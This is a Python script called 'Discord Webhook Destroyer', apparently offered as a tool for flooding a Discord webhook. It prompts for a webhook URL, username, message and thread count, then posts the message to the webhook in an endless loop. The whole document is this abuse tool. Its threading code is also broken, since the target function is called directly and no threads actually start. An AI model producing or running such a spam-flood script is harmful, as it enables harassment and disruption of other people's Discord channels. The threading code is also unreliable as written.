import requests
import threading

defaultusername = 'Webhook Destroyer XD'
defaultmessage = 'webhook xd'

print('Discord Webhook Destroyer\n')


def sendtowebhook(webhook, message, username):
    data = {
        'content': message,
        'username': username
    }
    try:
        while True:
            requests.post(webhook, data=data)
    except KeyboardInterrupt:  # prevents error trace on keyboardinterrupt and exits cleanly
        exit()


webhook = input('What is the webhook link?: ')
if webhook == '':  # script will not work without specifying a webhook link, so exit
    print('You need to specify a webhook link for this to work, exiting...')
    exit()

username = input('What would you like the username to be?: ')
if username == '':  #  no username will default to a specified default
    username = defaultusername
    print('Using default username...')

message = input('What message would you like to send?: ')
if message == '':  # no message will cause the webhook message not to send, so default to specified default
    message = defaultmessage
    print('Using default message...')

try:
    threads = int(input('How many threads would you like to run on?: '))
    if threads < 1:  # prevent negative/0 threads from breaking the script
        print('Negative or no threads, defaulting to 1...')
        threads = 1
except ValueError:  # prevents ValueError if the result cannot be converted to a string
    threads = 1
    print('Invalid amount of threads, defaulting to 1...')

print('Webhook destroyer starting, press CTRL+C to stop.')

for x in range(threads):
    thread = threading.Thread(
        target=sendtowebhook(webhook, message, username), args=(1,))
    thread.start()
    # threading actually doesn't help very much due to discord's rate limiting
